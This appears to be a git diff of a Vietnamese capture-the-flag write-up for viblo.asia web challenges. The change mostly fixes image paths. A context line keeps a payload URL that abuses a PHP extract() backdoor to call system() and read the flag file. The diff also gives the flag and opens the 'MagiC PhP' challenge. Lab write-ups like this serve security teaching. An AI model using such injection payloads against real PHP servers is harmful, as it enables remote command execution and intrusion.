@@ -256,19 +256,19 @@ Ta lại truyền vào tham số để hàm extract trích xuất và tạo ra b
 
 Payload: [http://172.104.49.143:1302/phpinfo.php?It=system&works=cat%20ngoc_trinh_is_sexy](http://172.104.49.143:1302/phpinfo.php?It=system&works=cat ngoc_trinh_is_sexy)
 
-![image-20200412231130132](/Users/haiclover/Documents/@CTF/@Chall_CTF_Library/ctf.viblo.asia/Writeup/images/image-20200412231130132.png)
+![image-20200412231130132](images/image-20200412231130132.png)
 
 `Flag{php_backdoor_is_sexy_too}`
 
 ## 10.[MagiC PhP](https://ctf.viblo.asia/puzzles/magic-php-t0dnftx3ter)
 
-![image-20200412231326505](/Users/haiclover/Documents/@CTF/@Chall_CTF_Library/ctf.viblo.asia/Writeup/images/image-20200412231326505.png)
+![image-20200412231326505](images/image-20200412231326505.png)
 
-![image-20200412231354680](/Users/haiclover/Documents/@CTF/@Chall_CTF_Library/ctf.viblo.asia/Writeup/images/image-20200412231354680.png)
+![image-20200412231354680](images/image-20200412231354680.png)
 
-![image-20200412231408743](/Users/haiclover/Documents/@CTF/@Chall_CTF_Library/ctf.viblo.asia/Writeup/images/image-20200412231408743.png)
+![image-20200412231408743](images/image-20200412231408743.png)
 
-![image-20200412231422896](/Users/haiclover/Documents/@CTF/@Chall_CTF_Library/ctf.viblo.asia/Writeup/images/image-20200412231422896.png)
+![image-20200412231422896](images/image-20200412231422896.png)
 
 Theo như code thì nó sẽ gán giá trị của `$value` bằng giá trị của value trong phương thức POST gửi lên.
 
